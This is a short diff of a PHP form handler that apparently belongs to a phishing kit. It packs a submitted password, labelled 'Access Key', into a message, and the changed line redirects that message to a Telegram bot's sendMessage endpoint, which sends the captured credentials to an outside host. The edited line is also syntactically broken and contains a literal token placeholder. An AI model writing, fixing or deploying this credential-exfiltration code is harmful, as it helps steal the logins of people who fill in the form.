@@ -20,7 +20,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                       . "🔑 Access Key: " . $password;
 
         // 3. FIXED ENDPOINT: Added api.telegram.org/bot to route data properly
-        $telegram_url = "https://api.telegram.org" . $bot_token . "/sendMessage";
+        $telegram_url = "https://api.telegram.org/bot<token>/sendMessage"
         
         // 4. Request payload parameters
         $data = [
